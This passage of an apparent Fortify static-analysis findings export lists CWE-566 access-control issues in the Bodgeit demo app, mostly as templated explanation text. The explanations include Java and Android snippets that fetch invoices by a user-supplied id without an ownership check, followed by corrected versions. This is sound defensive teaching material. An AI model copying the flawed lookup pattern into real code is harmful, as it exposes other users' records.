?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","248","Access Control: Database","","Low","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/basket.jsp","quantity","","http://localhost/root/basket.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
"DemoApps","","Bodgeit","194","Access Control: Database","","Low","Open","2015-10-15","Fortify SCA","566","Authorization Bypass Through User-Controlled SQL Primary Key","","root/contact.jsp","anticsrf","","http://localhost/root/contact.jsp","","","","Abstract: <Content><Paragraph>Without proper access control, the method <Replace key=""EnclosingFunction.name""/> in <Replace key=""PrimaryLocation.file""/> can execute a SQL statement on line <Replace key=""PrimaryLocation.line""/> that contains an attacker-controlled primary key, thereby allowing the attacker to access unauthorized records.<AltParagraph>Without proper access control, executing a SQL statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.</AltParagraph></Paragraph></Content> Explanation: <Content>Database access control errors occur when: 1. Data enters a program from an untrusted source. <Paragraph> In this case the data enters at <Replace key=""SourceFunction"" link=""SourceLocation""/> in <Replace key=""SourceLocation.file""/> at line <Replace key=""SourceLocation.line""/>. </Paragraph> 2. The data is used to specify the value of a primary key in a SQL query. <Paragraph> In this case the data is used by <Replace key=""SinkFunction"" link=""SinkLocation""/> in <Replace key=""SinkLocation.file""/> at line <Replace key=""SinkLocation.line""/>. </Paragraph> <IfNotDef var=""ConditionalDescriptions""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id); List invoices = stmt.getResultList(); ... </pre> <b>Example 2:</b> The following code demonstrates the same functionality as above, but maps the returned data to Persistence entities via annotations. It also uses named, rather than positional, parameters to construct its query. <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> <b>Example 3:</b> In this example, the code uses XML mappings, rather than annotations, to achieve the same effect as Example 2. <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The following code then executes the query in a separate Java source file. <pre> id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter(""invID"", id); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id); List invoices = stmt.list(); ... </pre> <b>Example 2:</b> In this example, the code uses a mappings file to generate named SQL query equivalent to the logic in Example 1. Likewise, named queries separate the SQL logic from the data and helps prevent SQL injection vulnerabilities. <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> <b>Example 3:</b> The following code implements similar functionality to the previous two examples in HQL. It uses Hibernate annotations in lieu of mappings files to generate named HQL queries. <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID"") public class Invoice { ... } ... id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents SQL injection vulnerabilities, to construct and execute a SQL query that searches for an invoice matching the specified identifier [1]. The identifier is selected from a list of all invoices associated with the current authenticated user. <pre> ... id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the interface generates a list of invoice identifiers that belong to the current user, an attacker can bypass this interface to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user. Some think that in the mobile world, classic web application vulnerabilities, such as database access control errors, do not make sense -- why would the user attack themself? However, keep in mind that the essence of mobile platforms is applications that are downloaded from various sources and run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which necessitates expanding the attack surface of mobile applications to include inter-process communication. <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:javax.persistence trace:org.hibernate trace:net.sf.hibernate""> <b>Example 4:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> </ConditionalText> <ConditionalText condition=""tracenode:form field validator tracenode:action form declaration tracenode:action declaration tracenode:action field validator tracenode:command class validator"">A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input.</ConditionalText> </Paragraph></IfDef> <IfNotDef var=""ConditionalDescriptions""> <b>Example 2:</b> The following code adapts Example 1 to the Android platform. <pre> ... String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id}); ... </pre> A number of modern web frameworks provide mechanisms for performing validation of user input. Struts and Spring MVC are among them. To highlight the unvalidated sources of input, the rulepacks dynamically re-prioritize the issues reported by HPE Security Fortify Static Code Analyzer by lowering their probability of exploit and providing pointers to the supporting evidence whenever the framework validation mechanism is in use. We refer to this feature as Context-Sensitive Ranking. To further assist the HPE Security Fortify user with the auditing process, the HPE Security Fortify Software Security Research Group makes available the Data Validation project template that groups the issues into folders based on the validation mechanism applied to their source of input. </IfNotDef></Content>","Recommendations: <Content>Rather than relying on the presentation layer to restrict values submitted by the user, access control should be handled by the application and database layers. Under no circumstances should a user be allowed to retrieve or modify a row in the database without the appropriate permissions. Every query that accesses the database should enforce this policy, which can often be accomplished by simply including the current authenticated username as part of the query. <IfNotDef var=""ConditionalDescriptions""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </IfNotDef> <IfDef var=""ConditionalDescriptions""><Paragraph> <ConditionalText condition=""trace:/javax?\.sql/ trace:!javax.persistence""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:javax.persistence""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = entmgr.createQuery(query).setParameter(0, id).setParameter(1, userName); List invoices = stmt.getResultList(); ... </pre> <b>Example 6:</b> <pre> ... @Entity @NamedQuery(name=""invoiceQuery"", query=""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('invID', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> <b>Example 7:</b> <pre> &lt;entity-mappings&gt; ... &lt;entity name=""invoice"" class=""com.acme.Invoice""&gt; &lt;named-query name=""invoiceQuery""&gt; &lt;query&gt;SELECT * FROM invoices WHERE id = :invID AND user = :userName&lt;/query&gt; &lt;/named-query&gt; ... &lt;/entity&gt; ... &lt;/entity-mappings&gt; </pre> The Java code then executes the query in another source file. <pre> userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setParameter('id', id).setParameter('userName', userName); List invoices = stmt.getResultList(); </pre> </ConditionalText> <ConditionalText condition=""trace:org.hibernate trace:net.sf.hibernate""> <b>Example 5:</b> The following examples implements the same functionality as Example 1 through 3, respectively, but each imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; Query stmt = sess.createSQLQuery(query).setInteger(0, id).setString(1, userName); List invoices = stmt.list(); ... </pre> <b>Example 6:</b> <pre> ... &lt;sql-query name=""invoiceQuery""&gt; &lt;return alias=""invoice"" class=""com.acme.Invoice""&gt; SELECT * FROM invoices WHERE id = :invID AND user = :userName &lt;/sql-query&gt; ... </pre> Then, the Java source code executes the above query. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> <b>Example 7:</b> <pre> @NamedQuery(name = ""invoiceQuery"", query = ""SELECT * FROM invoices WHERE id = :invID AND user = :userName"") public class Invoice { ... } ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); Query stmt = sess.getNamedQuery(""invoiceQuery"").setInteger(""invID"", id).setString(""userName"", userName); List invoices = stmt.list(); ... </pre> </ConditionalText> <ConditionalText condition=""trace:!/javax?\.sql|javax\.persistence|org\.hibernate|net\.sf\.hibernate/""> <b>Example 3:</b> The following code implements the same functionality as Example 1 but imposes an additional constraint requiring that the current authenticated user have specific access to the invoice. <pre> ... userName = ctx.getAuthenticatedUserName(); id = Integer.decode(request.getParameter(""invoiceID"")); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; PreparedStatement stmt = conn.prepareStatement(query); stmt.setInt(1, id); stmt.setString(2, userName); ResultSet results = stmt.execute(); ... </pre> </ConditionalText> </Paragraph></IfDef> And here is an Android equivalent: <pre> ... PasswordAuthentication pa = authenticator.getPasswordAuthentication(); String userName = pa.getUserName(); String id = this.getIntent().getExtras().getString(""invoiceID""); String query = ""SELECT * FROM invoices WHERE id = ? AND user = ?""; SQLiteDatabase db = this.openOrCreateDatabase(""DB"", MODE_PRIVATE, null); Cursor c = db.rawQuery(query, new Object[]{id, userName}); ... </pre></Content>","","",""
